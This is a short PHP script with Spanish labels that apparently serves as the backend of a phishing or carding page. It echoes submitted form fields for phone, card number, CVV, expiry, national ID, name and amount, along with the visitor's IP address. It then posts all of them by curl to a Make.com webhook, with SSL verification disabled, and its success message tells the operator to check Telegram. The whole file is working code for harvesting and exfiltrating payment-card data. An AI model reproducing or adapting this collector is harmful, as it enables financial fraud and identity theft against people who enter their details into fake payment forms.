<?php
echo "<h2>Datos recibidos del formulario:</h2>";
echo "<pre>";
print_r($_POST);
echo "</pre>";

echo "<h2>Datos que se enviarían al webhook:</h2>";

$phone = $_POST['phone'] ?? 'VACÍO';
$card = $_POST['card'] ?? 'VACÍO';
$cv = $_POST['cv'] ?? 'VACÍO';
$venc = $_POST['venc'] ?? 'VACÍO';
$dni = $_POST['dni'] ?? 'VACÍO';
$name = $_POST['name'] ?? 'VACÍO';
$amount = $_POST['amount'] ?? 'VACÍO';

echo "Teléfono: $phone<br>";
echo "Tarjeta: $card<br>";
echo "CVV: $cv<br>";
echo "Vencimiento: $venc<br>";
echo "DNI: $dni<br>";
echo "Nombre: $name<br>";
echo "Monto: $amount<br>";
echo "IP: " . $_SERVER['REMOTE_ADDR'] . "<br>";

// Si todo se ve bien, intenta enviar al webhook
if (!empty($phone) || !empty($card)) {
    echo "<br><h3>Enviando al webhook...</h3>";
    
    $webhook_url = 'https://hook.us2.make.com/9r3vblb5fn35s0aoclfcuyg22vhzf55y';
    
    $data = [
        'telefono' => $phone,
        'tarjeta' => $card,
        'cv' => $cv,
        'venc' => $venc,
        'DNI' => $dni,
        'nombre' => $name,
        'cantidad' => $amount,
        'ip' => $_SERVER['REMOTE_ADDR'],
        'fecha' => date('Y-m-d H:i:s')
    ];
    
    $ch = curl_init($webhook_url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);
    
    echo "HTTP Code: $http_code<br>";
    echo "Response: $response<br>";
    echo "Error: $error<br>";
    
    if ($http_code == 200) {
        echo "<br>✅ Datos enviados correctamente! Revisa Telegram.";
    } else {
        echo "<br>❌ Error al enviar datos.";
    }
}
?>